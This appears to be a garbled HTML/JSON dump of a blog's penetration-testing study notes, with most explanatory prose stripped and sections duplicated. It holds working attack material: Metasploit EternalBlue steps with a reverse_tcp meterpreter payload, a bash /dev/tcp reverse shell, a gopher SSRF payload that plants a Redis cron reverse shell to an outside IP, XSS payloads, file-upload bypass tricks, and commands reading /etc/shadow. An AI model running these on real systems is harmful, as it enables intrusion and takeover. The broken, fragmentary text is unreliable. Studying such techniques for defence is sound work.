C:\\ip.txt</td>\n</tr>\n</tbody></table>\n<p><strong>1</strong></p>\n<p>nmap ip</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nmap 192.168.0.101</span><br></pre></td></tr></table></figure>\n\n<p><strong>2</strong></p>\n<p>nmap ip1 ip2 </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nmap 192.168.0.101 192.168.0.110</span><br></pre></td></tr></table></figure>\n\n<p><strong>3</strong></p>\n<p>nmap xxx.xxx.xxx.xxx-xxx</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nmap 192.168.0.100-110</span><br></pre></td></tr></table></figure>\n\n<p><strong>4</strong></p>\n<p>namp xxx.xxx.xxx.xxx&#x2F;xx</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nmap 192.168.0.1/24</span><br></pre></td></tr></table></figure>\n\n<p><strong>5</strong></p>\n<p>nmap -iL <File path></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nmap -iL /root/target.txt</span><br></pre></td></tr></table></figure>\n\n<p><strong>6</strong></p>\n<p>nmap ip -exclude ip</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nmap 192.168.0.100-110 -exclude 192.168.0.103</span><br><span class=\"line\">   nmap 192.168.0.1/24 -exclude 192.168.0.103 </span><br></pre></td></tr></table></figure>\n\n<p><strong>7</strong></p>\n<p>nmap ip -p 123</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">:nmap 192.168.0.101 -p 80,8080,3306,3389</span><br></pre></td></tr></table></figure>\n\n<p><strong>8C</strong></p>\n<p>nmap -sP ip</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nmap -sP 192.168.0.1/24</span><br></pre></td></tr></table></figure>\n\n<p><strong>9</strong></p>\n<p>nmap -O ip</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nmap -O 192.168.0.101</span><br></pre></td></tr></table></figure>\n\n<p><strong>10</strong></p>\n<p>nmap -sS -p (,) -v ip</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nmap -sS -p 1-65535 192.168.0.101</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"MSF\"><a href=\"#MSF\" class=\"headerlink\" title=\"MSF\"></a>MSF</h3><h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h4><p>MetasploitMSF</p>\n<p><strong></strong></p>\n<h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h4><p> : <code>search ms17_010</code></p>\n<p>1</p>\n<p><code>use auxiliary/scanner/smb/smb_ms17_010</code></p>\n<p><code>options</code> </p>\n<p><code>set rhosts 192.168.174.129</code></p>\n<p>445nmapwindows445<code>set rport </code></p>\n<p><code>run</code><code>exploit</code> </p>\n<p>2</p>\n<p><code>use exploit/windows/smb/ms17_010_eternalblue</code></p>\n<p><code>options</code> </p>\n<p><code>set RHOSTS 192.168.174.129</code></p>\n<p><code>set RPORT 445</code></p>\n<p>payload<code>set payload windows/x64/meterpreter/reverse_tcp</code></p>\n<p><code>set LHOST 192.168.174.192</code></p>\n<p><code>run</code><code>exploit</code> </p>\n<h3 id=\"Linux\"><a href=\"#Linux\" class=\"headerlink\" title=\"Linux\"></a>Linux</h3><p><strong>netstat</strong></p>\n<p></p>\n<p>netstat []</p>\n<p></p>\n<ul>\n<li>-a</li>\n<li>-n</li>\n<li>-p</li>\n<li>-tTCP</li>\n<li>-uUDP</li>\n<li>-r</li>\n</ul>\n<p><strong>network</strong></p>\n<p></p>\n<p>networkservice network restart</p>\n<p><strong>chmod</strong></p>\n<p></p>\n<p>Linux</p>\n<ul>\n<li> </li>\n<li>d </li>\n<li>s socket</li>\n<li>l </li>\n<li>p </li>\n<li>c </li>\n<li>b </li>\n</ul>\n<p><code>uname -a</code>: Linux!(,Linux)</p>\n<p></p>\n<ul>\n<li>cat &#x2F;etc&#x2F;issue: ,(PS:)</li>\n<li>cat &#x2F;etc&#x2F;<em>-release: (,,</em>ls &#x2F;etc | grep release!)</li>\n<li>cat &#x2F;proc&#x2F;version: ,gcc</li>\n<li>cat &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;version: ,uname -v(&#x2F;proc&#x2F;sys&#x2F;kernelLinux!!)</li>\n</ul>\n<p></p>\n<pre><code>ps: \n    ps -elf: (-l)UID,PPIP,CSTIME(-f)(-e)\n    ps aux: (u)(a)(x)\ntop: Windows\n</code></pre>\n<p><code>cat /etc/passwd</code>: </p>\n<p><code>cat /etc/shadow</code>: ,!</p>\n<p><code>cat /etc/sudoers</code>:    </p>\n<p><code>ifconfig -a</code>: </p>\n<p><code>hostname</code>: </p>\n<h4 id=\"shell\"><a href=\"#shell\" class=\"headerlink\" title=\"shell\"></a>shell</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bash -i &gt;&amp; /dev/tcp/192.168.0.4/7777 0&gt;&amp;1</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"OSI\"><a href=\"#OSI\" class=\"headerlink\" title=\"OSI\"></a>OSI</h3><p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151440002.png\"\n                        alt=\"-1685330434325\"\n                 ><strong></strong>OSI</p>\n<p><strong></strong>,</p>\n<p><strong></strong></p>\n<p><strong></strong></p>\n<p><strong>IP</strong>&#x2F;</p>\n<p><strong></strong></p>\n<p><strong></strong></p>\n<h3 id=\"TCP-IP\"><a href=\"#TCP-IP\" class=\"headerlink\" title=\"TCP&#x2F;IP\"></a>TCP&#x2F;IP</h3><h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151440451.png\"\n                        alt=\"-1685330444867\"\n                 ></h4><p>TCP&#x2F;IPOSI</p>\n<p>TCP&#x2F;IPOSI</p>\n<p>TCP&#x2F;IPUDP</p>\n<h3 id=\"xsscsrfssrf\"><a href=\"#xsscsrfssrf\" class=\"headerlink\" title=\"xsscsrfssrf\"></a>xsscsrfssrf</h3><p><strong></strong><br> XSSCSRF,SSRFWeb</p>\n<p><strong></strong><br> XSShtml</p>\n<p>CSRF()httpreferCookie  </p>\n<p>SSRF(URLRUL</p>\n","site":{"data":{"keep":{"base_info":{"primary_color":"#0066cc","title":"P1taya","author":"P1taya","avatar":"/images/p1taya.jpg","logo":"/images/p1taya.jpg","favicon":"/images/p1taya.jpg"},"menu":{"home":"/ || fa-solid fa-home","archives":"/archives || fa-solid fa-box-archive","categories":"/categories || fa-solid fa-layer-group","links":"/links || fa-solid fa-link","about":"/about || fa-solid fa-user-graduate","photos":"/photos || fa-solid fa-image"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":" || ","hitokoto":false},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"created || fa-solid fa-home","post_datetime_format":"YYYY-MM-DD HH:mm:ss"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":false,"reward":{"enable":false,"img_link":null,"text":null}},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"obsidian"},"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":false},"lazyload":{"enable":true},"footer":{"since":2022,"word_count":true},"inject":{"enable":true,"css":["/css/demo1.css"],"js":[null]}},"links":[{"name":"dog","link":"https://wuster.store/","avatar":"https://wuster.store/images/favicon.ico"},{"name":"","link":"https://fushuling.com/","avatar":"https://fushuling-1309926051.cos.ap-shanghai.myqcloud.com/avatar.jpg"}]}},"more":"<h1 id=\"prepare\"><a href=\"#prepare\" class=\"headerlink\" title=\"prepare\"></a>prepare</h1><h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p></p>\n<p></p>\n<h3 id=\"sql\"><a href=\"#sql\" class=\"headerlink\" title=\"sql\"></a>sql</h3><h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a><strong></strong></h4><p>mysqlsqlserveroracleaccesssqlitepostgreSQL</p>\n<ul>\n<li><p>mysql:3306 </p>\n</li>\n<li><p>sqlserver:1433 </p>\n</li>\n<li><p>orecal:1521 </p>\n</li>\n<li><p>PostgreSQL:5432 </p>\n</li>\n<li><p>db2:50000</p>\n</li>\n<li><p>MongoDB:27017 </p>\n</li>\n<li><p>redis:6379 </p>\n</li>\n<li><p>memcached:11211</p>\n</li>\n</ul>\n<h4 id=\"SQL\"><a href=\"#SQL\" class=\"headerlink\" title=\"SQL\"></a><strong>SQL</strong></h4><p><br> </p>\n<p></p>\n<p>GETPOSTCOOKIEHTTP</p>\n<h4 id=\"SQL\"><a href=\"#SQL\" class=\"headerlink\" title=\"SQL\"></a><strong>SQL</strong></h4><p></p>\n<ul>\n<li> </li>\n<li> </li>\n<li> </li>\n<li></li>\n</ul>\n<p></p>\n<ul>\n<li> </li>\n<li> </li>\n<li>WAF</li>\n</ul>\n<h4 id=\"sqlgetshell\"><a href=\"#sqlgetshell\" class=\"headerlink\" title=\"sqlgetshell\"></a>sqlgetshell</h4><ul>\n<li>SQL</li>\n<li>web</li>\n<li></li>\n<li>secure_file_privsecure_file_privload dumpfileinto outfileload_file()</li>\n</ul>\n<h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h4><ul>\n<li></li>\n<li></li>\n<li>  &#x2F;**&#x2F;</li>\n<li> %20 %09 %0a</li>\n<li></li>\n<li></li>\n<li>join</li>\n<li>like</li>\n</ul>\n<h3 id=\"xss\"><a href=\"#xss\" class=\"headerlink\" title=\"xss\"></a>xss</h3><h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h4><p>xssjavascriptjs</p>\n<h4 id=\"xss\"><a href=\"#xss\" class=\"headerlink\" title=\"xss\"></a>xss</h4><p><br> <br> scriptjs</p>\n<h4 id=\"xss\"><a href=\"#xss\" class=\"headerlink\" title=\"xss\"></a>xss</h4><h5 id=\"DOMXSS\"><a href=\"#DOMXSS\" class=\"headerlink\" title=\"DOMXSS\"></a>DOMXSS</h5><p>js</p>\n<h5 id=\"XSS\"><a href=\"#XSS\" class=\"headerlink\" title=\"XSS\"></a>XSS</h5><p>js</p>\n<h5 id=\"XSS\"><a href=\"#XSS\" class=\"headerlink\" title=\"XSS\"></a>XSS</h5><p>jsjs</p>\n<h4 id=\"xss\"><a href=\"#xss\" class=\"headerlink\" title=\"xss\"></a>xss</h4><ul>\n<li>COOKIE</li>\n<li>DOM</li>\n<li></li>\n<li>xss</li>\n<li></li>\n</ul>\n<h4 id=\"xss\"><a href=\"#xss\" class=\"headerlink\" title=\"xss\"></a>xss</h4><ul>\n<li></li>\n<li></li>\n<li>htmlHTMLEncodejavascriptJavaScriptEncodejavascriptEncodedata</li>\n<li>httponlytrue</li>\n</ul>\n<h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h4><ul>\n<li><p></p>\n</li>\n<li><p>script<br></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;input  value=&#x27;123&#x27; onclick=&#x27;alert()&#x27;&gt;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;a src=javascript:alert()&gt;123&lt;/a&gt;</span><br></pre></td></tr></table></figure></li>\n</ul>\n<h3 id=\"ssrf\"><a href=\"#ssrf\" class=\"headerlink\" title=\"ssrf\"></a>ssrf</h3><h4 id=\"-1\"><a href=\"#-1\" class=\"headerlink\" title=\"\"></a></h4><p>Server Side Request Forgery, SSRFSSRF</p>\n<h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h4><p>SSRFFile</p>\n<p>SSRF</p>\n<h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h4><p>SSRF</p>\n<p>curl, dictRedisfilegopherShellPayload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl -vvv &#x27;dict://127.0.0.1:6379/info&#x27;</span><br><span class=\"line\"> </span><br><span class=\"line\">curl -vvv &#x27;file:///etc/passwd&#x27;</span><br><span class=\"line\"> </span><br><span class=\"line\"># * : $</span><br><span class=\"line\"> </span><br><span class=\"line\">curl -vvv &#x27;gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/103.21.140.84/6789 0&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a&#x27;</span><br></pre></td></tr></table></figure>\n\n\n\n<h4 id=\"-1\"><a href=\"#-1\" class=\"headerlink\" title=\"\"></a></h4><p>IP192.168.0.1IP</p>\n<blockquote>\n<ul>\n<li><p>80300.0250.0.1</p>\n</li>\n<li><p>160xC0.0xA8.0.1</p>\n</li>\n<li><p>103232235521</p>\n</li>\n<li><p>160xC0A80001</p>\n</li>\n<li><p>1.1.278 &#x2F; 1.1.755</p>\n</li>\n<li><p>1.278 &#x2F; 1.755 &#x2F; 3.14159267</p>\n</li>\n<li><p>0.0.0.0IP</p>\n</li>\n<li><p><code>xip.io</code> IP</p>\n<p>192.168.0.1.xip.io192.168.0.1</p>\n</li>\n</ul>\n</blockquote>\n<h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h4><blockquote>\n<ul>\n<li></li>\n<li></li>\n<li></li>\n<li></li>\n<li>DNS RebindingDNSHost</li>\n</ul>\n</blockquote>\n<ol>\n<li>GET</li>\n<li>httphttps</li>\n<li>CRLF</li>\n<li>setInstanceFollowRedirectsfalse302</li>\n<li>urlipv4   <ol>\n<li>ip</li>\n<li><strong>ipurlip</strong>DNS Rebinding</li>\n</ol>\n</li>\n</ol>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h4><p></p>\n<pre><code>\n1Web\n2\n3\n</code></pre>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151439718.png\"\n                        alt=\"-1685330394483\"\n                 ></p>\n<h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h4><p>1.</p>\n<p>JS<br><br>1<br>2BurpSuit.<br>2.<br>1%00</p>\n<p>CorPHP,0x00xxx.php%00.jpg.jpg0x00xxx.php<br>URL%00ASCII0ASCII0</p>\n<h4 id=\"-2\"><a href=\"#-2\" class=\"headerlink\" title=\"\"></a></h4><h5 id=\"htaccess\"><a href=\"#htaccess\" class=\"headerlink\" title=\".htaccess\"></a>.htaccess</h5><blockquote>\n<p>htaccess <a class=\"link\"   href=\"https://so.csdn.net/so/search?q=apache&spm=1001.2101.3001.7020\" >apache<i class=\"fas fa-external-link-alt\"></i></a>apache</p>\n</blockquote>\n<p>.htaccessSetHandler application&#x2F;x-http-phpphpphpPHP</p>\n<h5 id=\"user-ini\"><a href=\"#user-ini\" class=\"headerlink\" title=\".user.ini\"></a>.user.ini</h5><p>php.iniphpweb.user.ini.htaccess.user.iniphp.ini</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">auto_prepend_file = &lt;filename&gt;         //</span><br><span class=\"line\">auto_append_file = &lt;filename&gt;          //</span><br></pre></td></tr></table></figure>\n\n<p>.user.ini</p>\n<h5 id=\"js\"><a href=\"#js\" class=\"headerlink\" title=\"js\"></a>js</h5><p></p>\n<h5 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h5><p>phtml php3 php4 php5 Php php () php.pphphp</p>\n<h5 id=\"content-type-GIF89a\"><a href=\"#content-type-GIF89a\" class=\"headerlink\" title=\"content-type,GIF89a\"></a>content-type,GIF89a</h5><h3 id=\"csrf\"><a href=\"#csrf\" class=\"headerlink\" title=\"csrf\"></a>csrf</h3><h4 id=\"-2\"><a href=\"#-2\" class=\"headerlink\" title=\"\"></a></h4><p></p>\n<p>CSRFCookieCSRF</p>\n<h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h4><p>1URL</p>\n<p>2Synchronizer Token,token</p>\n<p>3Referer HeaderURL</p>\n<p>4</p>\n<p>520</p>\n<p>6</p>\n<p>7postget</p>\n<p>8 XSS</p>\n<p>9</p>\n<p>10CSPContent-Security-Policy</p>\n<h4 id=\"XXE\"><a href=\"#XXE\" class=\"headerlink\" title=\"XXE\"></a>XXE</h4><p>XXEXML External Entity InjectionXMLXXEXML</p>\n<p>XMLXML</p>\n<p>  DOS</p>\n<h3 id=\"sqlmap\"><a href=\"#sqlmap\" class=\"headerlink\" title=\"sqlmap\"></a>sqlmap</h3><h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h4><p>-h                                           </p>\n<p>-hh                                         </p>\n<p>version                                </p>\n<p>-v                                           0-6  1<br>-u                                          url</p>\n<p>-d                                          </p>\n<p>-l                                           burp</p>\n<p>-r                                           http</p>\n<p>-g                                          google dorkurl</p>\n<p>-c                                          INI</p>\n<ol>\n<li><p>purge      purge </p>\n</li>\n<li><p>tables      </p>\n</li>\n<li><p>dbs         </p>\n</li>\n<li><p>current-db    </p>\n</li>\n<li><p>current-user  </p>\n</li>\n<li><p>is-dba   </p>\n</li>\n<li><p>batch      </p>\n</li>\n<li><p>search   -D -T -C CTD</p>\n</li>\n<li><p>threads 10  sqlmap10</p>\n</li>\n<li><p>level 3        sqlmapGETPOSTlevel2HTTP Cookie<br>                       3User-AgentHTTP Referer5</p>\n</li>\n<li><p>risk 3           0-31risk</p>\n</li>\n<li><p>-v   (0-6)<br>  0Python<br>  1<br>  2<br>  3<br>  4HTTP<br>  5HTTP<br>  6HTTP</p>\n</li>\n<li><p>privileges  </p>\n</li>\n<li><p>tamper xx.py,cc.py   tamperpy</p>\n</li>\n<li><p>method POST data page&#x3D;1&amp;id&#x3D;2   POST</p>\n</li>\n<li><p>threads number </p>\n</li>\n<li><p>referer    referer</p>\n</li>\n<li><p>user-agent      user-agent</p>\n</li>\n<li><p>proxy    </p>\n</li>\n</ol>\n<p>1.url</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot;</span><br></pre></td></tr></table></figure>\n\n<p>2.url</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sqlmap -m 1.txt</span><br></pre></td></tr></table></figure>\n\n<p>3.HTTP</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sqlmap -r  url.txt</span><br></pre></td></tr></table></figure>\n\n<p>4.google</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sqlmap -g &quot;inurl:\\&quot;.php?id=1\\&quot;&quot;</span><br></pre></td></tr></table></figure>\n\n<p>5.burp</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sqlmap -l    burp.txt</span><br></pre></td></tr></table></figure>\n\n<p>-sqlmap</p>\n<p>1.GET</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot;</span><br></pre></td></tr></table></figure>\n\n<p>2.POST</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1&quot;  --data=&quot;id=1&quot;</span><br></pre></td></tr></table></figure>\n\n\n\n<ol>\n<li><p>sqlmap -u  <a class=\"link\"   href=\"http://www.xx.com/?id=x\" >http://www.xx.com?id=x<i class=\"fas fa-external-link-alt\"></i></a>    </p>\n</li>\n<li><p>dbs         </p>\n</li>\n<li><p>current-db    </p>\n</li>\n<li><p>tables -D db_name   -D</p>\n</li>\n<li><p>columns  -T table_name -D db_name  </p>\n</li>\n<li><p>dump -C columns_name -T table_name -D db_name  </p>\n</li>\n</ol>\n<p>POST</p>\n<pre><code>1http:// www.xxx.com /login.asp\n2brup\n3\n4burppost\n5.txt\n6sqlmap\n</code></pre>\n<p>sqlmap -r okay.txt  -p  username</p>\n<p>&#x2F;&#x2F; -r(5)-ppostname</p>\n<h3 id=\"AWVS\"><a href=\"#AWVS\" class=\"headerlink\" title=\"AWVS\"></a>AWVS</h3><h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h4><p>Acunetix Web Vulnerability ScannerAWVSWebHTTP&#x2F;HTTPSWebWeb</p>\n<p>AWVSSQLXSSWeb</p>\n<h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h4><ul>\n<li><p>AjaxWeb2.0</p>\n</li>\n<li><p>SQL</p>\n</li>\n<li><p>HTPP EditorHTTP Fuzzer</p>\n</li>\n<li><p>web</p>\n</li>\n<li><p>CAPTHCATwo Factor</p>\n</li>\n<li><p>VISA PCI</p>\n</li>\n<li><p></p>\n</li>\n<li><p>web</p>\n</li>\n<li><p>AcunetixflashSOAPAJAX</p>\n</li>\n<li><p>web</p>\n</li>\n<li><p></p>\n</li>\n</ul>\n<h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h4><ul>\n<li><p>robots.txtAWVS</p>\n</li>\n<li><p>AWVS WVS3 </p>\n</li>\n<li><p>AWVSAlerts Node()</p>\n</li>\n<li><p></p>\n</li>\n</ul>\n<h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h4><p>5DashboardTargetsVulnerabilitiesScansReports</p>\n<ul>\n<li>Dashboard</li>\n<li>Targets</li>\n<li>Vulnerabilities</li>\n<li>ScansTarget</li>\n<li>Reports</li>\n</ul>\n<p>8UsersScan TypesNetwork ScannerIssue TrackersEmail SettingsEnginesExcluded HoursProxy Settings</p>\n<ul>\n<li>Users</li>\n<li>Scan TypesSQL </li>\n<li>Network Scanner</li>\n<li>Issue TrackersgithubgitlabJIRA</li>\n<li>Email Settings</li>\n<li>Engines</li>\n<li>Excluded Hours</li>\n<li>Proxy Settings</li>\n</ul>\n<h3 id=\"APPSCAN\"><a href=\"#APPSCAN\" class=\"headerlink\" title=\"APPSCAN\"></a>APPSCAN</h3><h4 id=\"-1\"><a href=\"#-1\" class=\"headerlink\" title=\"\"></a></h4><p>AppScanIBMwebWindowsWeb</p>\n<h4 id=\"-1\"><a href=\"#-1\" class=\"headerlink\" title=\"\"></a></h4><p>1web</p>\n<p>2HTTP Request</p>\n<p>3 Response </p>\n<h3 id=\"wireshark\"><a href=\"#wireshark\" class=\"headerlink\" title=\"wireshark\"></a>wireshark</h3><h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h4><p>1<br> 2<br> 3</p>\n<h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h4><p><code></code></p>\n<h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h4><h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h4><p>tcpTCP<br> httpHTTP<br> icmpICMP</p>\n<h4 id=\"ip\"><a href=\"#ip\" class=\"headerlink\" title=\"ip\"></a>ip</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ip.src ==192.168.1.104 192.168.1.104</span><br><span class=\"line\">ip.dst==192.168.1.104, 192.168.1.104</span><br><span class=\"line\">ip.addr == 192.168.1.104 IPIP192.168.1.104</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h4><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tcp.port ==80,  80</span><br><span class=\"line\">tcp.srcport == 80,  TCP80</span><br><span class=\"line\">tcp.dstport == 80TCP80</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"Http\"><a href=\"#Http\" class=\"headerlink\" title=\"Http\"></a>Http</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http.request.method==GET, HTTP GET</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"-and-or-not\"><a href=\"#-and-or-not\" class=\"headerlink\" title=\" and&#x2F;or&#x2F;not\"></a> and&#x2F;or&#x2F;not</h4><p>and&#x2F;orIP192.168.1.104ICMP<code>ip.addr == 192.168.1.104 and icmp</code></p>\n<h3 id=\"nmap\"><a href=\"#nmap\" class=\"headerlink\" title=\"nmap\"></a>nmap</h3><table>\n<thead>\n<tr>\n<th>()</th>\n<th></th>\n</tr>\n</thead>\n<tbody><tr>\n<td>-sT</td>\n<td>TCP connect()</td>\n</tr>\n<tr>\n<td>-sS</td>\n<td>Root</td>\n</tr>\n<tr>\n<td>-sF  -sN</td>\n<td>FINXmas TreeNull</td>\n</tr>\n<tr>\n<td>-sP</td>\n<td>pingNmappingNmap</td>\n</tr>\n<tr>\n<td>-sU</td>\n<td>UDPUDP</td>\n</tr>\n<tr>\n<td>-sA</td>\n<td></td>\n</tr>\n<tr>\n<td>-sV</td>\n<td></td>\n</tr>\n<tr>\n<td>-Pn</td>\n<td>pingping</td>\n</tr>\n<tr>\n<td>-v</td>\n<td></td>\n</tr>\n<tr>\n<td>-h</td>\n<td></td>\n</tr>\n<tr>\n<td>-p</td>\n<td>1-6553514331352280</td>\n</tr>\n<tr>\n<td>-O</td>\n<td></td>\n</tr>\n<tr>\n<td>-A</td>\n<td></td>\n</tr>\n<tr>\n<td>-oN&#x2F;-oX&#x2F;-oG</td>\n<td>XMLgrepable </td>\n</tr>\n<tr>\n<td>-T4</td>\n<td>TCP10ms</td>\n</tr>\n<tr>\n<td>-iL</td>\n<td>-iL C:\\ip.txt</td>\n</tr>\n</tbody></table>\n<p><strong>1</strong></p>\n<p>nmap ip</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nmap 192.168.0.101</span><br></pre></td></tr></table></figure>\n\n<p><strong>2</strong></p>\n<p>nmap ip1 ip2 </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nmap 192.168.0.101 192.168.0.110</span><br></pre></td></tr></table></figure>\n\n<p><strong>3</strong></p>\n<p>nmap xxx.xxx.xxx.xxx-xxx</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span 